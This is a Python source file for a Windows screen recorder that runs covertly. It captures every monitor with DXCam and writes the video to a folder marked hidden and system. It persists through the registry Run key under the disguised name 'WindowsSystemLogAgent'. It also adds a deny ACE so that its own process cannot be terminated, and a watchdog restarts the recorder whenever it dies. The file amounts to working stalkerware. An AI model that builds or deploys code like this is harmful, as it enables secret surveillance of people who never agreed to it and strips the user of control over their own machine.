"""
Stealth Enterprise Recorder - Persistence & Local Storage
=========================================================
Features:
- DXCam (GPU-based) for high performance screen capture
- Self-Persistence (Auto-add to Startup Registry)
- Process Watchdog (Parent resurrects Child)
- Hidden Local Storage (System + Hidden attributes)
- Motion Detection (Saves disk space)
"""

import cv2
import time
import numpy as np
import dxcam
import sys
import os
import shutil
import subprocess
import threading
import logging
import ctypes
import winreg
import psutil
try:
    import win32api
    import win32security
    import win32con
    PYWIN32_AVAILABLE = True
except ImportError:
    PYWIN32_AVAILABLE = False
    # Define dummy constants if needed or just skip logic
    pass
from pathlib import Path
from datetime import datetime
from typing import Optional, List, Tuple

# ============================================================================
# CONFIGURATION
# ============================================================================

# Storage Helper
def _get_best_storage_base() -> Path:
    """Finds the drive with the most free space."""
    best_path = Path(os.getenv('APPDATA'))  # Fallback
    max_free = 0
    try:
        # Iterate over all mounted disk partitions
        for part in psutil.disk_partitions(all=False):
            if 'cdrom' in part.opts or part.fstype == '':
                continue
            try:
                usage = psutil.disk_usage(part.mountpoint)
                if usage.free > max_free:
                    max_free = usage.free
                    best_path = Path(part.mountpoint)
            except Exception:
                continue
    except Exception:
        pass
    return best_path / "SysLog_Service"

class Config:
    # Basic settings
    FPS = 5.0
    CHUNK_DURATION = 600  # 10 minutes
    MOTION_THRESHOLD = 0.8  # Percent of pixels changed
    
    # Storage
    BASE_DIR = _get_best_storage_base()
    HIDDEN_STORAGE = BASE_DIR / "data"
    
    # Persistence
    APP_NAME = "WindowsSystemLogAgent"  # Name in Task Manager/Startup
    
    @staticmethod
    def get_monitor_filename(timestamp: int, monitor_idx: int) -> str:
        return f"log_{timestamp}_{monitor_idx}.mkv"

# ============================================================================
# PERSISTENCE & WATCHDOG UTILS
# ============================================================================

class StealthManager:
    """Manages hiding files, ensuring startup persistence, and process hardening."""
    
    @staticmethod
    def protect_process():
        """
        Hardens the current process against termination by adding a DENY ACE 
        to the process's Access Control List (ACL).
        """
        if not PYWIN32_AVAILABLE:
            logging.warning("pywin32 not installed. Process protection disabled.")
            return

        try:
            # Get handle to current process
            # We need WRITE_DAC access to change permissions
            # Using specific access rights often avoids generic access denied errors
            h_process = win32api.OpenProcess(
                win32con.PROCESS_QUERY_INFORMATION | win32con.WRITE_DAC | win32con.READ_CONTROL,
                False, win32api.GetCurrentProcessId()
            )
            
            # Get the current Security Descriptor
            sd = win32security.GetKernelObjectSecurity(h_process, win32security.DACL_SECURITY_INFORMATION)
            dacl = sd.GetSecurityDescriptorDacl()
            if dacl is None:
                dacl = win32security.ACL()

            # Create the SID for "World" (Everyone) -> S-1-1-0
            world_sid = win32security.GetBinarySid("S-1-1-0")
            
            # Mask: Terminate | VM_Write (memory mod) | VM_Operation
            deny_mask = (win32con.PROCESS_TERMINATE | 
                        win32con.PROCESS_VM_WRITE | 
                        win32con.PROCESS_VM_OPERATION)
            
            # Add Deny ACE to the beginning of the list
            dacl.AddAccessDeniedAceEx(win32security.ACL_REVISION, 0, deny_mask, world_sid)
            
            # Update the SD
            sd.SetSecurityDescriptorDacl(1, dacl, 0)
            
            # Apply to process
            win32security.SetKernelObjectSecurity(h_process, win32security.DACL_SECURITY_INFORMATION, sd)
            logging.info(f"Process protection active for PID {os.getpid()}")
            # print(f"Protected PID {os.getpid()}") 
        except Exception as e:
            # print(f"Failed to protect process: {e}")
            logging.error(f"Failed to protect process: {e}")

    @staticmethod
    def hide_directory(path: Path):
        """Sets Hidden + System attributes on a directory."""
        if not path.exists():
            path.mkdir(parents=True, exist_ok=True)
        
        # Windows specific attribute setting
        try:
            ctypes.windll.kernel32.SetFileAttributesW(str(path), 0x02 | 0x04) # FILE_ATTRIBUTE_HIDDEN | SYSTEM
        except Exception:
            pass

    @staticmethod
    def install_autorun():
        """Adds specific registry key to run on startup."""
        exe_path = sys.executable
        script_path = str(Path(__file__).resolve())
        
        # Command to run python silently (using pythonw if available, else python)
        # In a real deployed exe, this would just be the exe path.
        # We start WITHOUT --worker so the Watchdog logic runs first!
        cmd = f'"{exe_path}" "{script_path}"'
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, Config.APP_NAME, 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(key)
        except Exception as e:
            print(f"Failed to install autorun: {e}")

# ============================================================================
# RECORDING LOGIC (DXCAM BASED)
# ============================================================================

class RecorderWorker:
    def __init__(self):
        self.running = True
        self.cameras = []
        
        # Protect Worker Process as well
        StealthManager.protect_process()
        
        Config.HIDDEN_STORAGE.mkdir(parents=True, exist_ok=True)
        StealthManager.hide_directory(Config.BASE_DIR)
        
    def _init_cameras(self) -> bool:
        """Attempts to initialize cameras. Returns True if successful, False otherwise."""
        # Clean up existing cameras if any
        if self.cameras:
            for cam in self.cameras:
                try:
                    # Explicit release of DXCam resources is critical
                    if cam is not None:
                        del cam
                except Exception:
                    pass
        self.cameras = []
        
        # Try finding monitors (indices 0 to 9)
        found_any = False
        for i in range(10):
            try:
                # Create camera for specific output, set color to BGR for OpenCV
                cam = dxcam.create(output_idx=i, output_color="BGR")
                if cam is None:
                    break
                self.cameras.append(cam)
                found_any = True
            except Exception:
                # Stop if we fail to create a camera (likely end of monitor list or locked screen)
                break
        
        if not found_any:
            return False
        return True

    def _get_writer(self, monitor_idx: int, width: int, height: int, timestamp: int):
        filename = Config.get_monitor_filename(timestamp, monitor_idx)
        filepath = str(Config.HIDDEN_STORAGE / filename)
        
        # MJPG is often safer for crash recovery than H264 if not using external dlls
        # But we stick to XVID/MKV as requested for generic compatibility
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        return cv2.VideoWriter(filepath, fourcc, Config.FPS, (width, height))

    def run(self):
        while self.running:
            # 1. Initialize Cameras (Wait loop if screen is locked/unavailable)
            if not self._init_cameras():
                print("Warning: No monitors detected or screen locked. Retrying in 5s...")
                time.sleep(5)
                continue
                
            # 2. Recording Loop
            writers = [None] * len(self.cameras)
            last_frames = [None] * len(self.cameras)
            chunk_start_time = time.time()
            
            # Initial Writers
            for i, cam in enumerate(self.cameras):
                writers[i] = self._get_writer(i, cam.width, cam.height, int(chunk_start_time))

            try:
                while self.running:
                    loop_start = time.time()
                    current_time = time.time()
                    
                    # Check for chunk rotation
                    if current_time - chunk_start_time > Config.CHUNK_DURATION:
                        for w in writers:
                            if w: w.release()
                        
                        chunk_start_time = current_time
                        for i, cam in enumerate(self.cameras):
                            writers[i] = self._get_writer(i, cam.width, cam.height, int(chunk_start_time))

                    # Capture & Process
                    for i, cam in enumerate(self.cameras):
                        try:
                            frame = cam.grab()
                        except Exception:
                            # If grabbing fails (e.g. screen lock), we break the inner loop
                            # This causes us to go back to the outer loop -> _init_cameras -> wait
                            raise IOError("Screen grab failed (likely locked).")

                        if frame is None:
                            continue
                            
                        # Frame is already BGR (configured in __init__)
                        # DXCam returns None if grab fails, but usually returns the current frame
                        
                        # Motion Detection
                        should_write = False
                        if last_frames[i] is None:
                            should_write = True
                        else:
                            # Fast subtraction
                            diff = cv2.absdiff(cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY), 
                                             cv2.cvtColor(last_frames[i], cv2.COLOR_BGR2GRAY))
                            _, thresh = cv2.threshold(diff, 25, 255, cv2.THRESH_BINARY)
                            if np.count_nonzero(thresh) > (frame.size / 3) * (Config.MOTION_THRESHOLD / 100):
                                should_write = True

                        if should_write:
                            writers[i].write(frame)
                            last_frames[i] = frame

                    # FPS Limit
                    elapsed = time.time() - loop_start
                    delay = (1.0 / Config.FPS) - elapsed
                    if delay > 0:
                        time.sleep(delay)
                        
            except (KeyboardInterrupt, IOError):
                # IOError is raised above when screen is locked
                pass
            except Exception as e:
                print(f"Worker Error: {e}")
                time.sleep(1) # Brief pause before retry
            finally:
                for w in writers:
                    if w: w.release()
                # Ensure we release cameras here too before retrying
                for cam in self.cameras:
                    try:
                        del cam
                    except:
                        pass
                self.cameras = []

# ============================================================================
# VIDEO RETRIEVAL LOGIC (THE "PLAYER" PROBLEM)
# ============================================================================

class VideoRetriever:
    """
    This class demonstrates how to solve the '13:05 to 13:08' problem.
    It logicially selects the correct files.
    """
    @staticmethod
    def find_videos_for_range(start_epoch: int, end_epoch: int) -> List[Path]:
        """
        Returns a list of file paths that contain video data for the requested timeframe.
        Logic: A file is relevant if its (FileStart < RequestEnd) AND (FileEnd > RequestStart).
        """
        all_files = sorted(Config.HIDDEN_STORAGE.glob("*.mkv"))
        relevant_files = []
        
        for f in all_files:
            try:
                # Assuming format log_START_MON.mkv 
                # Note: We need the END time to be accurate. 
                # In the simplified recorder above, I name files by START.
                # To really do this, we usually rely on file modification time (mtime) as the END time.
                
                parts = f.stem.split('_')
                f_start = int(parts[1])
                f_end = int(f.stat().st_mtime) # Modification time is when the chunk finished
                
                # Check for overlap
                if f_start < end_epoch and f_end > start_epoch:
                    relevant_files.append(f)
            except:
                continue
                
        return relevant_files

    @staticmethod
    def explanation():
        return """
        To play a seamless video from 13:05 to 13:08 from fragmented files:
        1. Call find_videos_for_range(timestamp_1305, timestamp_1308).
        2. Load the list of returned files into OpenCV.
        3. Skip frames in the first file until timestamp matches 13:05.
        4. Play frames.
        5. When file ends, immediately load next file.
        6. Stop when timestamp matches 13:08.
        """

def find_existing_worker() -> Optional[psutil.Process]:
    """Finds an existing worker process (same script with --worker)."""
    current_pid = os.getpid()
    script_name = os.path.basename(__file__)
    
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if proc.pid == current_pid:
                continue
            
            cmdline = proc.info['cmdline']
            if cmdline:
                # Join arguments to check for script and flag
                # We check for the script name in the arguments
                cmd_str = ' '.join(cmdline)
                if script_name in cmd_str and "--worker" in cmd_str:
                    return proc
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return None

def find_existing_watchdog() -> Optional[psutil.Process]:
    """Finds an existing watchdog process (same script WITHOUT --worker)."""
    current_pid = os.getpid()
    script_name = os.path.basename(__file__)
    
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if proc.pid == current_pid:
                continue
            
            cmdline = proc.info['cmdline']
            if cmdline:
                cmd_str = ' '.join(cmdline)
                # Check if it is running THIS script
                if script_name in cmd_str:
                    # If it has --worker, it is a worker, not a watchdog
                    if "--worker" not in cmd_str:
                        return proc
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return None

# ============================================================================
# MAIN ENTRY / WATCHDOG
# ============================================================================

def main():
    # If run with --worker flag, this is the recording process
    if len(sys.argv) > 1 and sys.argv[1] == "--worker":
        worker = RecorderWorker()
        worker.run()
        return

    # === WATCHDOG MODE (DEFAULT) ===
    
    # 0. Check for existing Watchdog (Father Process)
    existing_watchdog = find_existing_watchdog()
    if existing_watchdog:
        print(f"[Watchdog] Another instance is already running (PID {existing_watchdog.pid}). Exiting.")
        return

    # 1. Install Persistence
    StealthManager.install_autorun()
    StealthManager.hide_directory(Config.BASE_DIR)
    
    # 2. Harden Process (Prevent Termination)
    StealthManager.protect_process()
    
    print(f"[Watchdog] Protecting recorder. Storage: {Config.HIDDEN_STORAGE}")
    
    # 2. Watchdog Loop
    while True:
        try:
            # Check for existing worker before spawning
            existing_worker = find_existing_worker()
            
            if existing_worker:
                print(f"[Watchdog] Found existing worker (PID {existing_worker.pid}). Monitoring...")
                p = existing_worker
            else:
                # Spawn the worker process
                # We use the same python interpreter and script path
                print("[Watchdog] Spawning new worker...")
                p = subprocess.Popen([sys.executable, __file__, "--worker"])
            
            # Wait for it to finish (or crash)
            try:
                exit_code = p.wait()
            except psutil.NoSuchProcess:
                exit_code = "Unknown (Already Dead)"

            # If we get here, the worker died. Restart immediately.
            print(f"[Watchdog] Worker died (code {exit_code}). Resurrecting...")
            time.sleep(1) # Brief pause to prevent CPU spinning if error is persistent
            
        except KeyboardInterrupt:
            # Allow manual kill of the watchdog
            break
        except Exception as e:
            print(f"[Watchdog] Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
